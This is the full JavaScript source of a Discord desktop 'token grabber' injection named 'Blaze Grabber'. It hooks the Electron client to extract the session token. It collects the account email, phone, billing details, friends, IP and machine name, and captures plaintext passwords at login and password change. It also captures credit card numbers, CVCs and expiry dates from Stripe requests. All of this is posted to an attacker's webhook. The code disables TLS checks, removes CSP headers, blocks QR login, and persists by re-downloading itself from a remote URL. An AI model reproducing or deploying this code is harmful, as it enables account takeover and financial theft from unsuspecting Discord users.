'use strict';

process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';

const fs           = require('fs');
const path         = require('path');
const https        = require('https');
const electron     = require('electron');
const queryString  = require('querystring');

// ── Config ────────────────────────────────────────────────────────────────────
const WEBHOOK       = '%WEBHOOK%';
const AVATAR_URL    = 'https://i.pinimg.com/originals/43/79/bb/4379bb008f3b678c973727818e68ab35.gif';
const EMBED_COLOR   = 0xFF2514;
const USERNAME      = 'Blaze Grabber';
const INJECT_URL    = 'https://raw.githubusercontent.com/blazewys/discordinjection/refs/heads/main/dcinject.js';
const CORE_NAME     = 'discord_desktop_core-1'; // replaced by Injection.py at build time

// ── State ─────────────────────────────────────────────────────────────────────
let _initDone      = false;   // FirstTime() sadece bir kez çalışsın
let _updateDone    = false;   // checUpdate() sadece bir kez çalışsın

// ── Helpers ───────────────────────────────────────────────────────────────────

/** Discord'un webpack chunk'larından aktif token'ı çeker. */
const TOKEN_SCRIPT =
    "(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m)" +
    ".find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()";

async function execScript(str) {
    try {
        const win = electron.BrowserWindow.getAllWindows()[0];
        if (!win) return null;
        return await win.webContents.executeJavaScript(str, true) || null;
    } catch {
        return null;
    }
}

/** Discord API'ye GET isteği atar, JSON döner. */
async function apiGet(endpoint, token) {
    return new Promise(resolve => {
        const url = new URL(endpoint);
        const options = {
            hostname: url.hostname,
            path:     url.pathname + url.search,
            method:   'GET',
            headers:  { Authorization: token, 'Content-Type': 'application/json' },
            timeout:  10000,
        };
        const req = https.request(options, res => {
            let body = '';
            res.on('data', d => body += d);
            res.on('end', () => {
                try { resolve(JSON.parse(body)); }
                catch { resolve(null); }
            });
        });
        req.on('error',   () => resolve(null));
        req.on('timeout', () => { req.destroy(); resolve(null); });
        req.end();
    });
}

/** IP adresini çeker. */
async function getIP() {
    return new Promise(resolve => {
        const req = https.get('https://api.ipify.org?format=json', { timeout: 8000 }, res => {
            let body = '';
            res.on('data', d => body += d);
            res.on('end', () => {
                try { resolve(JSON.parse(body).ip || 'N/A'); }
                catch { resolve('N/A'); }
            });
        });
        req.on('error',   () => resolve('N/A'));
        req.on('timeout', () => { req.destroy(); resolve('N/A'); });
    });
}

/** Avatar/banner URL'sinin gif mi png mi olduğunu kontrol eder. */
async function resolveAvatar(baseUrl) {
    if (!baseUrl) return null;
    return new Promise(resolve => {
        const gifUrl = baseUrl + '.gif?size=512';
        const req = https.get(gifUrl, { timeout: 6000 }, res => {
            resolve(res.headers['content-type'] === 'image/gif'
                ? gifUrl
                : baseUrl + '.png?size=512');
        });
        req.on('error',   () => resolve(baseUrl + '.png?size=512'));
        req.on('timeout', () => { req.destroy(); resolve(baseUrl + '.png?size=512'); });
    });
}

/** Webhook'a JSON embed gönderir. */
async function postWebhook(payload) {
    return new Promise(resolve => {
        const body = JSON.stringify(payload);
        const url  = new URL(WEBHOOK);
        const options = {
            hostname: url.hostname,
            path:     url.pathname + url.search,
            method:   'POST',
            headers:  { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
            timeout:  15000,
        };
        const req = https.request(options, res => {
            res.resume();
            resolve(res.statusCode);
        });
        req.on('error',   () => resolve(null));
        req.on('timeout', () => { req.destroy(); resolve(null); });
        req.write(body);
        req.end();
    });
}

// ── Badge helpers ─────────────────────────────────────────────────────────────

const BADGE_MAP = [
    [1,       '<:staff:968704541946167357>'],
    [2,       '<:partner:968704542021652560>'],
    [4,       '<:hypersquad_events:968704541774192693>'],
    [8,       '<:bug_hunter_1:968704541677723648>'],
    [512,     '<:early_supporter:968704542126510090>'],
    [16384,   '<:bug_hunter_2:968704541774217246>'],
    [131072,  '<:verified_dev:968704541702905886>'],
    [262144,  '<:certified_moderator:988996447938674699>'],
    [4194304, '<:Active_Dev:1045024909690163210>'],
];

function getBadges(flags) {
    const badges = BADGE_MAP.filter(([v]) => (flags & v) === v).map(([, e]) => e);
    return badges.length ? badges.join(' ') : ':x:';
}

function getNitro(premiumType) {
    const types = { 0: ':x:', 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic' };
    return types[premiumType] ?? ':x:';
}

function getBilling(sources) {
    if (!sources || !sources.length) return ':x:';
    const out = sources
        .filter(s => !s.invalid)
        .map(s => s.type === 1 ? ':credit_card:' : s.type === 2 ? '<:paypal:973417655627288666>' : null)
        .filter(Boolean);
    return out.length ? out.join(' ') : ':x:';
}

/** HQ arkadaşları (sadece gerçek badge'li olanlar, HypeSquad house hariç). */
function parseHQFriends(relationships) {
    if (!relationships || !Array.isArray(relationships)) return '';
    const HQ_FLAGS = [1, 2, 4, 8, 512, 16384, 131072, 262144, 4194304];
    const lines = [];
    for (const rel of relationships) {
        if (rel.type !== 1) continue;
        const u      = rel.user || {};
        const flags  = u.public_flags || 0;
        const badges = BADGE_MAP
            .filter(([v]) => HQ_FLAGS.includes(v) && (flags & v) === v)
            .map(([, e]) => e);
        if (!badges.length) continue;
        lines.push(`${badges.join('')} \`${u.username}\` (\`${u.id}\`)`);
        if (lines.join('\n').length > 900) break;
    }
    return lines.join('\n');
}

// ── Embed builder ─────────────────────────────────────────────────────────────

function buildPayload(title, fields, thumbnail, image) {
    const embed = { title, color: EMBED_COLOR, fields, footer: { text: USERNAME } };
    if (thumbnail) embed.thumbnail = { url: thumbnail };
    if (image)     embed.image     = { url: image };
    return {
        username:   USERNAME,
        avatar_url: AVATAR_URL,
        embeds:     [embed],
    };
}

// ── Kullanıcı bilgilerini topla ───────────────────────────────────────────────

async function collectUserData(token) {
    const [user, billing, friends] = await Promise.all([
        apiGet('https://discord.com/api/v9/users/@me',                          token),
        apiGet('https://discord.com/api/v9/users/@me/billing/payment-sources',  token),
        apiGet('https://discord.com/api/v9/users/@me/relationships',            token),
    ]);
    if (!user || user.message) return null;

    const avatarBase = user.avatar
        ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
        : null;
    const bannerBase = user.banner
        ? `https://cdn.discordapp.com/banners/${user.id}/${user.banner}`
        : null;

    const [avatar, banner] = await Promise.all([
        resolveAvatar(avatarBase),
        resolveAvatar(bannerBase),
    ]);

    return { user, billing, friends, avatar, banner };
}

function buildUserFields(user, billing, friends, token, extra) {
    const fields = [
        { name: '👤 Username',  value: `\`${user.username}\``,                   inline: true  },
        { name: '🆔 ID',        value: `\`${user.id}\``,                         inline: true  },
        { name: '📧 Email',     value: `\`${user.email || 'N/A'}\``,             inline: true  },
        { name: '📱 Phone',     value: `\`${user.phone || 'N/A'}\``,             inline: true  },
        { name: '🔒 2FA',       value: user.mfa_enabled ? '✅' : '❌',           inline: true  },
        { name: '💎 Nitro',     value: getNitro(user.premium_type),              inline: true  },
        { name: '💳 Billing',   value: getBilling(billing),                      inline: true  },
        { name: '🏅 Badges',    value: getBadges(user.public_flags || 0),        inline: true  },
        ...(extra || []),
        { name: '🔑 Token',     value: `\`${token}\``,                           inline: false },
    ];

    const hq = parseHQFriends(friends);
    if (hq) fields.push({ name: '⭐ HQ Friends', value: hq, inline: false });

    return fields;
}

// ── Discord client klasörünü bul ──────────────────────────────────────────────

function getDiscordClientName() {
    const parts = __dirname.replace(/\\/g, '/').split('/');
    for (let i = parts.length - 1; i >= 0; i--) {
        if (/^Discord(PTB|Canary|Development)?$/i.test(parts[i])) return parts[i];
    }
    return 'Discord';
}

// ── FirstTime — başlangıç bildirimi ──────────────────────────────────────────

async function firstTime() {
    if (_initDone) return;
    _initDone = true;

    try {
        const token = await execScript(TOKEN_SCRIPT);
        const ip    = await getIP();
        const client = getDiscordClientName();

        if (!token) {
            // Kullanıcı giriş yapmamış — sadece sistem bilgisi gönder
            await postWebhook(buildPayload(
                'Discord Injection — No Session',
                [
                    { name: '💻 Computer',  value: `\`${process.env.COMPUTERNAME || 'N/A'}\``, inline: true },
                    { name: '🌐 IP',        value: `\`${ip}\``,                                 inline: true },
                    { name: '📂 Client',    value: `\`${client}\``,                             inline: true },
                ],
                AVATAR_URL, null
            ));
            return;
        }

        const data = await collectUserData(token);
        if (!data) return;

        const { user, billing, friends, avatar, banner } = data;
        const extraFields = [
            { name: '💻 Computer', value: `\`${process.env.COMPUTERNAME || 'N/A'}\``, inline: true },
            { name: '🌐 IP',       value: `\`${ip}\``,                                 inline: true },
            { name: '📂 Client',   value: `\`${client}\``,                             inline: true },
        ];

        await postWebhook(buildPayload(
            'Discord Injection — Initialized',
            buildUserFields(user, billing, friends, token, extraFields),
            avatar || AVATAR_URL,
            banner || null
        ));
    } catch { /* sessiz fail */ }
}

// ── checUpdate — injection'ı güncel tut, sadece bir kez ──────────────────────

function checUpdate() {
    if (_updateDone) return;
    _updateDone = true;

    try {
        // app/ klasörü (Discord'un app.asar'ın yanında)
        const appPath   = electron.app.getAppPath().replace(/\\/g, '/').replace(/\/app\.asar$/, '');
        const appName   = electron.app.getName();
        const resDir    = `${appPath}/app`;
        const pkgFile   = `${resDir}/package.json`;
        const idxFile   = `${resDir}/index.js`;

        if (!fs.existsSync(resDir)) fs.mkdirSync(resDir, { recursive: true });
        fs.writeFileSync(pkgFile, JSON.stringify({ name: appName, main: './index.js' }));

        // index.js: Discord her güncellendiğinde injection'ı yeniden yükle
        const selfPath = __filename.replace(/\\/g, '/');
        const script = [
            `'use strict';`,
            `const fs = require('fs'), https = require('https');`,
            `const _idx = ${JSON.stringify(selfPath)};`,
            `const _url = ${JSON.stringify(INJECT_URL)};`,
            `const _wh  = ${JSON.stringify(WEBHOOK)};`,
            `function _reInject() {`,
            `    https.get(_url, { timeout: 15000 }, res => {`,
            `        let b = '';`,
            `        res.on('data', d => b += d);`,
            `        res.on('end', () => {`,
            `            try {`,
            `                const cur = fs.readFileSync(_idx, 'utf8');`,
            `                if (cur === "module.exports = require('./core.asar');") {`,
            `                    fs.writeFileSync(_idx, b.replace('%WEBHOOK%', _wh));`,
            `                }`,
            `            } catch {}`,
            `        });`,
            `    }).on('error', () => setTimeout(_reInject, 30000));`,
            `}`,
            `_reInject();`,
            `require(${JSON.stringify(appPath + '/app.asar')});`,
        ].join('\n');

        fs.writeFileSync(idxFile, script);
    } catch { /* sessiz fail */ }
}

// ── onCompleted — login / şifre / email / kart yakalama ──────────────────────

const COMPLETED_FILTER = {
    urls: [
        'https://discord.com/api/v*/users/@me',
        'https://discordapp.com/api/v*/users/@me',
        'https://*.discord.com/api/v*/users/@me',
        'https://discord.com/api/v*/auth/login',
        'https://discordapp.com/api/v*/auth/login',
        'https://*.discord.com/api/v*/auth/login',
        'https://api.stripe.com/v*/tokens',
    ],
};

electron.session.defaultSession.webRequest.onCompleted(COMPLETED_FILTER, async (request) => {
    if (!['POST', 'PATCH'].includes(request.method)) return;
    if (request.statusCode !== 200) return;

    let data = {};
    try {
        const raw = request.uploadData?.[0]?.bytes?.toString() || '{}';
        try { data = JSON.parse(raw); }
        catch { data = queryString.parse(decodeURIComponent(raw)); }
    } catch { return; }

    const token = await execScript(TOKEN_SCRIPT);
    if (!token) return;

    const ip     = await getIP();
    const client = getDiscordClientName();
    const ud     = await collectUserData(token);
    if (!ud) return;

    const { user, billing, friends, avatar, banner } = ud;
    const baseExtra = [
        { name: '💻 Computer', value: `\`${process.env.COMPUTERNAME || 'N/A'}\``, inline: true },
        { name: '🌐 IP',       value: `\`${ip}\``,                                 inline: true },
        { name: '📂 Client',   value: `\`${client}\``,                             inline: true },
    ];

    // — Login: şifre yakalandı
    if (request.url.includes('/auth/login') && data.password) {
        await postWebhook(buildPayload(
            'Discord — Login Captured',
            buildUserFields(user, billing, friends, token, [
                ...baseExtra,
                { name: '🔑 Password', value: `\`${data.password}\``, inline: false },
            ]),
            avatar || AVATAR_URL, banner || null
        ));
        return;
    }

    // — PATCH /users/@me: şifre veya email değişikliği
    if (request.url.includes('/users/@me') && request.method === 'PATCH' && data.password) {
        if (data.new_password) {
            await postWebhook(buildPayload(
                'Discord — Password Changed',
                buildUserFields(user, billing, friends, token, [
                    ...baseExtra,
                    { name: '🔑 Old Password', value: `\`${data.password}\``,     inline: true },
                    { name: '🔑 New Password', value: `\`${data.new_password}\``, inline: true },
                ]),
                avatar || AVATAR_URL, banner || null
            ));
        }
        if (data.email) {
            await postWebhook(buildPayload(
                'Discord — Email Changed',
                buildUserFields(user, billing, friends, token, [
                    ...baseExtra,
                    { name: '📧 New Email', value: `\`${data.email}\``,     inline: true },
                    { name: '🔑 Password',  value: `\`${data.password}\``,  inline: true },
                ]),
                avatar || AVATAR_URL, banner || null
            ));
        }
        return;
    }

    // — Stripe: kredi kartı eklendi
    if (request.url.includes('api.stripe.com')) {
        const card = data['card[number]'] || 'N/A';
        const cvc  = data['card[cvc]']    || 'N/A';
        const mon  = data['card[exp_month]'] || '?';
        const yr   = data['card[exp_year]']  || '?';
        await postWebhook(buildPayload(
            'Discord — Credit Card Added',
            buildUserFields(user, billing, friends, token, [
                ...baseExtra,
                { name: '💳 Card Number', value: `\`${card}\``,       inline: true },
                { name: '🔒 CVC',         value: `\`${cvc}\``,        inline: true },
                { name: '📅 Expiry',      value: `\`${mon}/${yr}\``,  inline: true },
            ]),
            avatar || AVATAR_URL, banner || null
        ));
        return;
    }
});

// ── onBeforeRequest — QR login engelle + init + update ───────────────────────

const BEFORE_FILTER = {
    urls: [
        'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
        'https://*.discord.com/api/v*/applications/detectable',
        'https://discord.com/api/v*/applications/detectable',
        'wss://remote-auth-gateway.discord.gg/*',
    ],
};

electron.session.defaultSession.webRequest.onBeforeRequest(BEFORE_FILTER, async (details, callback) => {
    await electron.app.whenReady();

    // QR login'i tamamen engelle
    if (details.url.startsWith('wss://remote-auth-gateway')) {
        return callback({ cancel: true });
    }

    // İlk çalışma bildirimi (sadece bir kez)
    firstTime();

    // Injection güncelleme mekanizması (sadece bir kez)
    checUpdate();

    callback({});
});

// ── onHeadersReceived — CSP kaldır ───────────────────────────────────────────

electron.session.defaultSession.webRequest.onHeadersReceived((request, callback) => {
    const headers = { ...request.responseHeaders };
    delete headers['content-security-policy'];
    delete headers['content-security-policy-report-only'];
    headers['Access-Control-Allow-Headers'] = ['*'];
    callback({ responseHeaders: headers });
});

// ── Discord core'u yükle ─────────────────────────────────────────────────────

module.exports = require('./core.asar');
